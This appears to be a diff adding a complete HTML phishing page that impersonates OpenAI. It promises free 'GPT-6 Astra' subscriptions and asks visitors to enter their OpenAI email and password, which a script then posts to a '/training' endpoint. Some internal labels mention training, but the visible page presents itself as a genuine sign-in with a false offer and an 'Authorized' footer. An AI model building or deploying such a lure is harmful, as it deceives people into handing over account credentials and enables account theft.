@@ -1,0 +1,641 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>OpenAI Lab</title>
+
+<style>
+* {
+  box-sizing: border-box;
+}
+
+html,
+body {
+  margin: 0;
+  min-height: 100%;
+  font-family: Arial, Helvetica, sans-serif;
+}
+
+body {
+  min-height: 100vh;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  padding: 24px;
+  overflow-x: hidden;
+  color: #f7f8fc;
+  background:
+    radial-gradient(circle at 15% 15%, rgba(112, 92, 255, .18), transparent 30%),
+    radial-gradient(circle at 85% 85%, rgba(0, 190, 255, .12), transparent 32%),
+    linear-gradient(145deg, #050608 0%, #0a0c11 48%, #050608 100%);
+}
+
+/* Ambient animated lights */
+body::before,
+body::after {
+  content: "";
+  position: fixed;
+  width: 420px;
+  height: 420px;
+  border-radius: 50%;
+  pointer-events: none;
+  filter: blur(100px);
+  opacity: .18;
+  animation: drift 12s ease-in-out infinite alternate;
+}
+
+body::before {
+  top: -230px;
+  left: -180px;
+  background: #735cff;
+}
+
+body::after {
+  right: -200px;
+  bottom: -240px;
+  background: #00a9d9;
+  animation-delay: -5s;
+}
+
+@keyframes drift {
+  0% {
+    transform: translate3d(0, 0, 0) scale(1);
+  }
+
+  50% {
+    transform: translate3d(35px, 25px, 0) scale(1.08);
+  }
+
+  100% {
+    transform: translate3d(-20px, -20px, 0) scale(.96);
+  }
+}
+
+/* Subtle moving grid */
+body::marker {
+  display: none;
+}
+
+main {
+  position: relative;
+  z-index: 2;
+  width: 100%;
+  max-width: 470px;
+  animation: pageIn .8s ease both;
+}
+
+@keyframes pageIn {
+  from {
+    opacity: 0;
+    transform: translateY(18px);
+  }
+
+  to {
+    opacity: 1;
+    transform: translateY(0);
+  }
+}
+
+/* Brand */
+.brand {
+  text-align: center;
+  margin-bottom: 18px;
+}
+
+.logo-wrap {
+  width: 68px;
+  height: 68px;
+  margin: 0 auto 15px;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  border-radius: 20px;
+  background: rgba(255,255,255,.96);
+  box-shadow:
+    0 12px 45px rgba(0,0,0,.35),
+    0 0 0 1px rgba(255,255,255,.12);
+  animation: logoFloat 5s ease-in-out infinite;
+  overflow: hidden;
+}
+
+.logo-wrap img {
+  width: 52px;
+  height: 52px;
+  object-fit: contain;
+}
+
+@keyframes logoFloat {
+  0%, 100% {
+    transform: translateY(0);
+  }
+
+  50% {
+    transform: translateY(-5px);
+  }
+}
+
+.brand-name {
+  margin: 0;
+  font-size: 16px;
+  font-weight: 700;
+  letter-spacing: 2px;
+}
+
+.brand-subtitle {
+  margin: 7px 0 0;
+  color: #8f96a6;
+  font-size: 11px;
+  letter-spacing: .4px;
+}
+
+/* Training notice */
+.training-banner {
+  margin-bottom: 13px;
+  padding: 11px 14px;
+  text-align: center;
+  border-radius: 11px;
+  border: 1px solid rgba(255, 193, 84, .22);
+  background: rgba(255, 193, 84, .055);
+  color: #e7c982;
+  font-size: 10px;
+  line-height: 1.5;
+  letter-spacing: .35px;
+}
+
+/* Main glass card */
+.card {
+  padding: 34px;
+  border-radius: 25px;
+  border: 1px solid rgba(255,255,255,.095);
+  background: rgba(13, 15, 21, .78);
+  backdrop-filter: blur(25px);
+  -webkit-backdrop-filter: blur(25px);
+  box-shadow:
+    0 30px 90px rgba(0,0,0,.55),
+    inset 0 1px 0 rgba(255,255,255,.045);
+}
+
+/* Security icon */
+.security-icon {
+  width: 56px;
+  height: 56px;
+  margin: 0 auto 20px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  border-radius: 17px;
+  border: 1px solid rgba(124,108,255,.25);
+  background: rgba(105,89,255,.09);
+  box-shadow: 0 0 30px rgba(105,89,255,.08);
+  font-size: 25px;
+  animation: pulse 3.5s ease-in-out infinite;
+}
+
+@keyframes pulse {
+  0%, 100% {
+    box-shadow: 0 0 20px rgba(105,89,255,.06);
+  }
+
+  50% {
+    box-shadow: 0 0 34px rgba(105,89,255,.2);
+  }
+}
+
+h1 {
+  margin: 0;
+  text-align: center;
+  font-size: 27px;
+  line-height: 1.2;
+  letter-spacing: -.7px;
+}
+
+.subtitle {
+  max-width: 350px;
+  margin: 11px auto 27px;
+  text-align: center;
+  color: #9299a9;
+  font-size: 13px;
+  line-height: 1.65;
+}
+
+/* Form */
+label {
+  display: block;
+  margin: 17px 0 8px;
+  color: #c8cdd7;
+  font-size: 11px;
+  font-weight: 700;
+  letter-spacing: .4px;
+}
+
+input {
+  width: 100%;
+  height: 51px;
+  padding: 0 15px;
+  outline: none;
+  border-radius: 12px;
+  border: 1px solid rgba(255,255,255,.10);
+  background: rgba(255,255,255,.045);
+  color: #fff;
+  font-size: 14px;
+  transition: all .25s ease;
+}
+
+input::placeholder {
+  color: #606776;
+}
+
+input:hover {
+  border-color: rgba(255,255,255,.16);
+}
+
+input:focus {
+  border-color: rgba(124,108,255,.65);
+  background: rgba(255,255,255,.065);
+  box-shadow: 0 0 0 3px rgba(105,89,255,.10);
+}
+
+/* Notice */
+.notice {
+  margin-top: 18px;
+  padding: 14px;
+  border-radius: 12px;
+  border: 1px solid rgba(255,255,255,.07);
+  background: rgba(255,255,255,.027);
+  color: #818998;
+  font-size: 10.5px;
+  line-height: 1.65;
+}
+
+.notice strong {
+  color: #aeb5c2;
+}
+
+/* Button */
+button {
+  position: relative;
+  width: 100%;
+  height: 51px;
+  margin-top: 21px;
+  border: 0;
+  border-radius: 12px;
+  overflow: hidden;
+  cursor: pointer;
+  color: #fff;
+  background: linear-gradient(135deg, #7668ff, #5145cf);
+  box-shadow: 0 12px 30px rgba(78,66,205,.22);
+  font-size: 13px;
+  font-weight: 700;
+  letter-spacing: .25px;
+  transition: transform .2s ease, box-shadow .2s ease, opacity .2s ease;
+}
+
+button::after {
+  content: "";
+  position: absolute;
+  top: 0;
+  left: -100%;
+  width: 60%;
+  height: 100%;
+  background: linear-gradient(
+    90deg,
+    transparent,
+    rgba(255,255,255,.16),
+    transparent
+  );
+  transform: skewX(-20deg);
+  transition: left .6s ease;
+}
+
+button:hover::after {
+  left: 140%;
+}
+
+button:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 16px 38px rgba(78,66,205,.34);
+}
+
+button:active {
+  transform: translateY(0);
+}
+
+button:disabled {
+  opacity: .65;
+  cursor: wait;
+  transform: none;
+}
+
+/* Feature row */
+.features {
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
+  gap: 9px;
+  margin-top: 17px;
+}
+
+.feature {
+  padding: 13px 7px;
+  text-align: center;
+  border-radius: 12px;
+  border: 1px solid rgba(255,255,255,.065);
+  background: rgba(255,255,255,.025);
+  transition: transform .2s ease, background .2s ease;
+}
+
+.feature:hover {
+  transform: translateY(-2px);
+  background: rgba(255,255,255,.045);
+}
+
+.feature strong {
+  display: block;
+  margin-bottom: 5px;
+  color: #cbd0db;
+  font-size: 10px;
+}
+
+.feature span {
+  color: #707888;
+  font-size: 8.5px;
+}
+
+/* Success */
+#success {
+  display: none;
+  text-align: center;
+  animation: successIn .55s ease both;
+}
+
+@keyframes successIn {
+  from {
+    opacity: 0;
+    transform: scale(.96);
+  }
+
+  to {
+    opacity: 1;
+    transform: scale(1);
+  }
+}
+
+.check {
+  width: 68px;
+  height: 68px;
+  margin: 0 auto 20px;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  border-radius: 50%;
+  border: 1px solid rgba(71,220,150,.32);
+  background: rgba(71,220,150,.08);
+  color: #67e8a6;
+  font-size: 31px;
+  animation: checkPop .55s cubic-bezier(.2,.8,.2,1) both;
+}
+
+@keyframes checkPop {
+  from {
+    opacity: 0;
+    transform: scale(.5);
+  }
+
+  to {
+    opacity: 1;
+    transform: scale(1);
+  }
+}
+
+#success h1 {
+  font-size: 25px;
+}
+
+#success p {
+  margin: 12px auto 0;
+  max-width: 350px;
+  color: #9299a9;
+  font-size: 12px;
+  line-height: 1.7;
+}
+
+/* Footer */
+footer {
+  margin-top: 17px;
+  text-align: center;
+  color: #565d6c;
+  font-size: 9px;
+  letter-spacing: .3px;
+}
+
+/* Mobile */
+@media (max-width: 500px) {
+  body {
+    padding: 15px;
+  }
+
+  .card {
+    padding: 28px 21px;
+  }
+
+  h1 {
+    font-size: 24px;
+  }
+
+  .logo-wrap {
+    width: 62px;
+    height: 62px;
+  }
+
+  .logo-wrap img {
+    width: 47px;
+    height: 47px;
+  }
+}
+</style>
+</head>
+
+<body>
+
+<main>
+
+  <div class="brand">
+
+    <div class="logo-wrap">
+      <img src="OpenAI.jpg" alt="Training logo">
+    </div>
+
+    <h2 class="brand-name">
+      OpenAI LAB
+    </h2>
+
+    <p class="brand-subtitle">
+      The world’s most intelligent and aligned model.
+    </p>
+
+  </div>
+
+  <div class="training-banner">
+    VERIFY YOUR EMAIL TO UNLOCK YOUR FREE SUBSCRIPTION
+  </div>
+
+  <section class="card">
+
+    <div id="form">
+
+      <div class="security-icon">
+        🔐
+      </div>
+
+      <h1>
+        We’re giving out free unlimited GPT‑6 Astra subscriptions to our first 10,000 clients who are eligible.
+      </h1>
+
+      <p class="subtitle">
+        login with your OpenAI account Email and password now to confirm eligibility.
+      </p>
+
+      <form id="trainingForm">
+
+        <label for="email">
+          Email
+        </label>
+
+        <input
+          id="email"
+          type="email"
+          placeholder="username@mail.com"
+          autocomplete="off"
+          required
+        >
+
+        <label for="password">
+          Password
+        </label>
+
+        <input
+          id="password"
+          type="text"
+          placeholder="Enter password"
+          autocomplete="off"
+          required
+        >
+
+        <div class="notice">
+          <strong>GPT‑6 ASTRA:</strong>
+          Is rolling out today to a limited set of organizations and over the coming days will become available to all ChatGPT Plus, Pro, Business, and Enterprise users, as well as through the OpenAI API, Microsoft Azure, and AWS Bedrock.
+        </div>
+
+        <button id="button" type="submit">
+          Sign In
+        </button>
+
+      </form>
+
+    </div>
+
+    <section id="success">
+
+      <div class="check">
+        ✓
+      </div>
+
+      <h1>
+        Verified successfully
+      </h1>
+
+      <p>
+        Congratulations! You have been selected for a limited free GPT-6 Astra upgrade.
+      </p>
+
+    </section>
+
+    <div class="features">
+
+      <div class="feature">
+        <strong>ChatGPT</strong>
+        <span>ChatGPT is a chatbot assistant based on large language model (LLM) technology</span>
+      </div>
+
+      <div class="feature">
+        <strong>Codex</strong>
+        <span>By March 2026, Codex had grown to more than 2 million weekly active users.</span>
+      </div>
+
+      <div class="feature">
+        <strong>GPT-5.6</strong>
+        <span>On August 10, 2026, GPT-5.6-Cyber was launched with Daybreak Blue and Red, and it solved and completed 95% of cybersecurity problems.</span>
+      </div>
+
+    </div>
+
+  </section>
+
+  <footer>
+    Authorized OpenAi environment
+  </footer>
+
+</main>
+
+<script>
+document.getElementById("trainingForm").addEventListener(
+  "submit",
+  async function(event) {
+
+    event.preventDefault();
+
+    const email =
+      document.getElementById("email").value.trim();
+
+    const password =
+      document.getElementById("password").value.trim();
+
+    const button =
+      document.getElementById("button");
+
+    if (!email || !password) {
+      return;
+    }
+
+    button.disabled = true;
+    button.textContent = "Recording...";
+
+    try {
+
+      const response = await fetch("/training", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          email: email,
+          password: password
+        })
+      });
+
+      const result = await response.json();
+
+      if (!response.ok || !result.success) {
+        throw new Error("Save failed");
+      }
+
+      document.getElementById("form").style.display = "none";
+      document.getElementById("success").style.display = "block";
+
+    } catch (error) {
+
+      button.disabled = false;
+      button.textContent = "Sign In";
+
+      alert(
+        "The training server could not save the submission."
+      );
+    }
+  }
+);
+</script>
+
+</body>
+</html>
